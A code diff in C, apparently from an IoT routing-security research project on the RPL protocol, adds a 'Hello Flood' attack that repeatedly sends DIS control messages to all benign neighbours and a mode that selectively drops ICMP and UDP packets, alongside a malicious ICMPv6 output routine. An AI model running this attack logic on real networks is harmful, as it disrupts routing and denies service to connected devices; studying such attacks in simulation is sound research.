@@ -22,7 +22,7 @@ void init_flood(){
 /* Initialize selector node stats */
 void init_select(){
     select = true;
-    icmp_forwarded = icmp_dropped = 0;
+    icmp_sent = icmp_dropped = udp_dropped = 0;
     selecting = false;
 }
 
@@ -77,7 +77,6 @@ rpl_icmp6_malicious_output(uip_ipaddr_t *dest, const void *data, uint16_t datale
 {
   /* Make sure we're up-to-date before sending data out */
   rpl_dag_update_state();
-  
   /* Unicast or multicast */
   dest = dest != NULL ? dest : &rpl_multicast_addr;
   
@@ -131,14 +130,27 @@ void add_all_nodes(){
 /* Launch the Hello Flood attack */
 void launch_flooding_attack(){
       uint8_t i;
-      printf("ips: ");
-      for(i=0; i < (uint8_t)( sizeof(neighbors) / sizeof(neighbors[0])); ++i) {
-            if (neighbors[i].used) {
-                char buff[21];
-                uiplib_ipaddr_snprint(buff, sizeof(buff), &neighbors[i].ipaddr);
-                printf("%s, ", buff);
-            }
-            else break;
-       }
-       printf("\n");
+      uint8_t j = 0;
+      uip_ipaddr_t root_ip;
+      rpl_dag_get_root_ipaddr(&root_ip);
+      while (j < 20){
+          for(i=0; i < (uint8_t)( sizeof(neighbors) / sizeof(neighbors[0])); ++i) {
+                if (neighbors[i].used) {
+                    if (!neighbors[i].malicious && !uip_ipaddr_cmp(&root_ip, &neighbors[i].ipaddr)) {
+                        rpl_icmp6_dis_output(&neighbors[i].ipaddr);
+                        char buf[21];
+                        uiplib_ipaddr_snprint(buf, sizeof(buf), &neighbors[i].ipaddr);
+                        printf("sending DIS %d to %s\n",i,buf);
+                        ++dis_sent_flood;
+                    }
+                }
+                else break;
+          }
+          ++j; 
+     }
+}
+
+/* Start selecting packets */
+void start_filtering(){
+    selecting = true;
 }
